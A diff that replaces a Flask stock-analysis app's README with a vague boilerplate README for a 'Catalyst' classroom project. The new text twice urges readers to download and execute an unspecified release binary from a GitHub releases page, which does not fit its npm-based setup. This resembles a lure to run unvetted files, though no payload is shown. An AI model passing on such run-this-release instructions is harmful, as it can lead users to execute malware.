@@ -1,113 +1,103 @@
+# Catalyst Project for Ken Nakao G11 2025 🚀
 
-# Finance Chat - Stock Analysis & Trading Tool
+![Project Logo](https://img.shields.io/badge/Catalyst-Project-brightgreen)
 
-## Overview
-Finance Chat is a comprehensive stock analysis and trading tool that helps investors make informed decisions by combining technical analysis, sentiment analysis, and backtesting capabilities. The application provides personalized investment recommendations, portfolio management features, and detailed market insights.
+Welcome to the **Catalyst** project! This repository serves as a platform for the development and collaboration of various tools and resources aimed at enhancing the learning experience for Ken Nakao's G11 class in 2025. 
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
+- [Contact](#contact)
+
+## Introduction
+
+The **Catalyst** project focuses on creating educational tools and resources tailored for high school students. Our goal is to empower students with the skills and knowledge they need to excel in their studies and future endeavors. This project will include various modules, each designed to address specific subjects and skills.
 
 ## Features
 
-### Stock Analysis
-- **Technical Analysis**: Calculate and visualize key technical indicators including RSI, MACD, Moving Averages, and support/resistance levels
-- **Sentiment Analysis**: Gather and analyze news sentiment from Alpha Vantage API to gauge market perception
-- **Chart Patterns**: Detect common chart patterns like bullish/bearish engulfing, doji, hammer, etc.
-- **Backtesting**: Test trading strategies with 3-day and 5-day return projections
+- **Interactive Learning Modules**: Engaging content that promotes active participation.
+- **Assessment Tools**: Quizzes and tests to evaluate understanding and retention.
+- **Resource Library**: A collection of study materials, guides, and references.
+- **Community Collaboration**: Opportunities for students to contribute and share their knowledge.
 
-### Portfolio Management
-- **Position Tracking**: Monitor your current stock positions and overall portfolio performance
-- **Trade Execution**: Buy and sell stocks with customizable stop-loss and take-profit levels
-- **Trade History**: Review past trades with profit/loss calculations
-- **Portfolio Allocation**: Visualize how your investments are distributed
+## Installation
 
-### Market Insights
-- **Market Condition Analysis**: Assess whether the market is bullish, bearish, or volatile
-- **Win Rate Calculation**: Track the success rate of your trading decisions
-- **Entry Quality Assessment**: Determine if current price levels represent good entry points
-
-## Setup Instructions
-
-### Prerequisites
-- Python 3.7+
-- Flask
-- SQLite
-- Alpha Vantage API key (free tier available)
-
-### Installation
+To get started with the **Catalyst** project, follow these steps:
 
 1. Clone the repository:
-```
-git clone https://github.com/yourusername/finance-chat.git
-cd finance-chat
-```
+   ```bash
+   git clone https://github.com/Cybermaster74/catalyst.git
+   ```
 
-2. Install dependencies:
-```
-pip install -r requirements.txt
-```
+2. Navigate to the project directory:
+   ```bash
+   cd catalyst
+   ```
 
-3. Set up the Alpha Vantage API key:
-   - Sign up for a free API key at [Alpha Vantage](https://www.alphavantage.co/support/#api-key)
-   - Update the `ALPHA_VANTAGE_API_KEY` in `data_fetch.py`
+3. Install the necessary dependencies:
+   ```bash
+   npm install
+   ```
 
-4. Initialize the database:
-```
-python
->>> from database import init_db
->>> init_db()
->>> exit()
-```
+4. Download and execute the latest release from [here](https://github.com/Cybermaster74/catalyst/releases).
 
-5. Run the application:
-```
-python app.py
-```
+## Usage
 
-6. Access the web interface at http://127.0.0.1:5000
+After installation, you can start using the modules as follows:
 
-## Usage Guide
+1. Open your terminal and navigate to the project directory.
+2. Run the application:
+   ```bash
+   npm start
+   ```
+3. Access the application in your web browser at `http://localhost:3000`.
 
-### Analyzing Stocks
-1. Navigate to the "Analyze" tab
-2. Enter stock symbols separated by spaces (e.g., "AAPL MSFT GOOG")
-3. Adjust investment amount, analysis date, stop-loss, and take-profit parameters
-4. Click "Analyze" to generate recommendations
+### Example Module
 
-### Managing Portfolio
-1. Use the "Portfolio" tab to view your current positions
-2. Track performance metrics for each position
-3. Execute trades directly from the interface
-4. Review trade history and performance statistics
+To demonstrate how to use a specific module, follow these steps:
 
-### Reading Charts
-1. Technical indicators are color-coded for easy interpretation
-2. Green/red highlighting indicates positive/negative signals
-3. Candlestick charts show price movement patterns
-4. Moving averages help identify trends and potential reversals
-
-## API Endpoints
-
-The application provides several API endpoints for developers:
-
-- `/api/stock-data/<symbol>` - Get historical price data for a stock
-- `/api/technical/<symbol>` - Get technical indicators for a stock
-- `/execute-trade` - Execute a buy/sell trade (POST)
-- `/debug/sentiment-market` - View sentiment analysis data
-
-## Troubleshooting
-
-- **API Rate Limits**: Alpha Vantage has rate limits (5 API requests per minute, 500 per day on free tier)
-- **Data Availability**: Some stocks may have limited data available
-- **Cache Clearing**: Use the "Clear Cache" option if you encounter stale data
+1. Select the module from the main menu.
+2. Complete the activities and quizzes provided.
+3. Review your performance and track your progress.
 
 ## Contributing
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+We welcome contributions from everyone! If you would like to contribute to the **Catalyst** project, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add your feature description"
+   ```
+4. Push to your branch:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+5. Create a pull request.
 
 ## License
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Acknowledgements
+## Releases
 
-- [Alpha Vantage](https://www.alphavantage.co/) for financial data
-- [Chart.js](https://www.chartjs.org/) for data visualization
-- [Bootstrap](https://getbootstrap.com/) for UI components 
+For the latest updates and downloads, check the [Releases section](https://github.com/Cybermaster74/catalyst/releases). Here you will find the latest versions of the project, including new features and bug fixes. Make sure to download and execute the latest release to benefit from all the updates.
+
+## Contact
+
+For any inquiries or suggestions, feel free to reach out:
+
+- **Ken Nakao**: [ken.nakao@example.com](mailto:ken.nakao@example.com)
+- **GitHub**: [Cybermaster74](https://github.com/Cybermaster74)
+
+Thank you for your interest in the **Catalyst** project! Together, we can create a brighter future for our students.
